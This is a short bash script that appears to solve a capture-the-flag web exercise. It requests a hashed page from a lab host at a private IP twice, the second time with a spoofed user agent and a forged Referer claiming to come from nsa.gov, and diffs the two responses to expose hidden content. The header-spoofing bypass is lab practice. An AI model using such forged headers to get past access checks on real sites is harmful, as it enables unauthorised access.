#!/bin/bash

ip=192.168.1.11

curl http://$ip/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c > albatros_default

curl -A ft_bornToSec --referer https://www.nsa.gov/ http://$ip/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c > albatros

echo "\n---------- RESULT : ----------\n"
diff albatros albatros_default
